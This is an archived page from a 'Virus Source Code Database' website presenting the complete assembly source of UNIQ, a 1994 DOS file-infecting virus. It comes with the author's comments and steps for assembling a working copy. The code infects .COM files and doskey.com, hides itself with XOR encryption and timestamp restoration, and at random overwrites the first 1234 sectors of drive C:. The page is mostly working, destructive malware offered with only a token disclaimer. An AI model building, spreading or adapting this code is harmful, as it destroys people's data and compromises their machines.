<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: uniq_asm</title>
<meta name="KEYWORDS" content="uniq.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for uniq.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ugly2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ugly2_asm.php">ugly2_asm</a><br>
<a href="uk_ambul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/uk_ambul_asm.php">uk_ambul_asm</a><br>
<a href="ultimute_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ultimute_asm.php">ultimute_asm</a><br>
<a href="undpdos6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/undpdos6_asm.php">undpdos6_asm</a><br>
<a href="uniq_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/uniq_asm.php">uniq_asm</a><br>
<a href="unixtrojan_txt.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/unixtrojan_txt.php">unixtrojan_txt</a><br>
<a href="unkn_nmy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/unkn_nmy_asm.php">unkn_nmy_asm</a><br>
<a href="unkn-nmy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/unkn-nmy_asm.php">unkn-nmy_asm</a><br>
<a href="unknown__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/unknown__asm.php">unknown__asm</a><br>
<a href="unknown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/unknown_asm.php">unknown_asm</a><br>
<a href="ussr1193_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ussr1193_asm.php">ussr1193_asm</a><br>
<a href="ussr_516_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ussr_516_asm.php">ussr_516_asm</a><br>
<a href="ussr-516_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ussr-516_asm.php">ussr-516_asm</a><br>
<a href="ussr_600_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/ussr_600_asm.php">ussr_600_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; Virusname : UNIQ
; Origin    : Sweden
; Author    : Metal Militia/Immortal Riot
;
; Before you is a "fixed-up" version of the IR.144 virus. The
; differences are very big, though. To take some examples, thisone
; has direct infection of the KEYB.COM file in your \DOS directory,
; it's XOR encrypted, restore the files date/time stamp, set's the
; file attrib's to zero and has a probability of 2% that it overwrites
; the first 1234 sectors on your C: drive when executed. Since it more
; or less 'stays' in your computer after that direct infection, the
; regular user won't notice anything before the trashing routine does
; it's dirty work :) Thanks to The Unforgiven for "bug-fixing" a few
; things when i was totally fucked up by tiredness.
;
; In order to get a working copy of this virus you'll need to do the
; following: first assemble the dummy code below here plus the virus
; aswell. Then do a simple "copy /b dummy.com+uniq.com working.com".
; Now you'll have a ready one.
;
; -----------------------
;
; .model tiny ; DUMMY.ASM
; .code
; org 100h
;
; sov:
;
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
; xchg ax,ax ; nop
;
; end sov
;
; -----------------------
;

.model tiny ; UNIQ.ASM
.radix 16
.code
        org 100h
start:
call get_offset
get_offset:
pop     bp                   ; now we're here, so get it
sub     bp,offset get_offset ; and offset the 'procedure'

        call  enc_dec        ; decrypt us
        jmp   real_start

enc_val dw    0              ; "buffer" for our encryption value

write_da_code:
        call    enc_dec
        mov     ah,40                             ; write the
        mov     cx,end_virus-start                ; viral code
        lea     dx,[bp+start]                     ; to victim's
        int     21                                ; awesome phile
        call    enc_dec
        ret

enc_dec:
        mov      bx,word ptr [bp+enc_val]         ; use our encryption
        lea      si,[bp+real_start]               ; value
        mov      cx,(end_virus-real_start+1)/2
rock_on:
        xor      word ptr [si],bx     ; the XOR loop goes here
        inc      si
        inc      si
        loop     rock_on
        ret

real_start:
        lea     si,[buffa_bytes+bp]   ; restore
        mov     di,100                ; the first
        movsw                         ; four bytes
        movsw                         ; from our buffer

        lea     dx,[end_virus+bp]     ; set the DTA
        mov     ah,1a                 ; to end of our virus
        int     21

        lea     dx,[doskeycom+bp]     ; offset c:\dos\doskey.com
        call    affeqtiz              ; in order to infect aswell

        mov     ah,4e                 ; now, back to our "current" dir
        lea     dx,[find_files+bp]    ; locate first file "*.com"
find_next:
        int     21
        jc      reset_DTA             ; was there an *ERROR* ?
        call    infect                ; If not, continue w/infection

        mov     ah,4f                 ; and get next
        jmp     short find_next       ; to affect aswell

reset_DTA:
        mov     ah,2c                 ; get time
        int     21

        cmp     dl,2                  ; 2% chance
        ja      real_DTA_reset        ; no? outa here

        mov     al,2                  ; sheesh!
        mov     cx,4d2h               ; i guess
        cwd                           ; the dude
        int     26h                   ; will be
        popf                          ; gone after
                                      ; thisone :)
real_DTA_reset:
        mov     dx,80                 ; reset the DTA
        mov     ah,1a
        int     21

        mov     di,100                ; and 'JMP' back
        push    di                    ; to the original
        ret                           ; program :)

infect:
        lea     dx,[end_virus+1e+bp]  ; 1e in DTA = filename
affeqtiz:
        mov     ax,4301               ; remove da fileattrib's
        xor     cx,cx                 ; (or.. rather set to zero)
        int     21

        mov     ax,3d02               ; so.. open it!
        int     21
        jc      ret_me

        xchg    bx,ax                 ; mov bx,ax

        mov     ax,5700               ; save date/time
        int     21

        push    cx
        push    dx

        mov     ah,3f                 ; read in
        mov     cx,4                  ; first four bytes
        lea     dx,[buffa_bytes+bp]   ; and save them
        int     21                    ; in our buffer

        cmp     byte ptr [buffa_bytes+bp+3],'V'   ; fourth byte's a 'V'?
        jz      close_em                          ; if so, outa here!

        mov     ax,4202                           ; goto EOF
        sub     cx,cx
        cwd
        int     21

        sub     ax,3                              ;
        mov     word ptr [bp+jump_bytes+1],ax     ; offset our 'JMP'!

random:
        mov     ah,2ch                            ; get a random
        int     21h                               ; value to use
        add     dl, dh                            ; with the
        jz      random                            ; encryption
        mov     word ptr [bp+enc_val],bx
        call    write_da_code                     ; write our viral code

        mov     ax,4200                           ; goto SOF
        sub     cx,cx
        cwd
        int     21

        mov     ah,40                             ; write our
        mov     cx,4                              ; own first four
        lea     dx,[bp+jump_bytes]                ; bytes over the
        int     21                                ; original

close_em:
        pop     dx
        pop     cx

        mov     ax,5701                           ; restore date/time
        int     21

        mov     ah,3e                             ; now close the fucker
        int     21
ret_me:
        ret                                       ; and ret to get next

V_name          db      '[UNiQ]'                  ; virus name
V_author        db      '(c) 1994 Metal Militia'  ; virus author
V_group_origin  db      'Immortal Riot, Sweden'   ; author group, origin
doskeycom       db      'c:\dos\doskey.com',0     ; direct infection
find_files      db      '*.com',0                 ; files to infect
jump_bytes      db      0e9,0,0,'V'               ; our marked "JMP"

buffa_bytes:                                      ; org. first 4 buffa
        xchg ax,ax ; one byte (nop)
        xchg ax,ax ; one byte (nop)
        int     20 ; two bytes

end_virus:
end start
</textarea></td></tr></table></body></html>
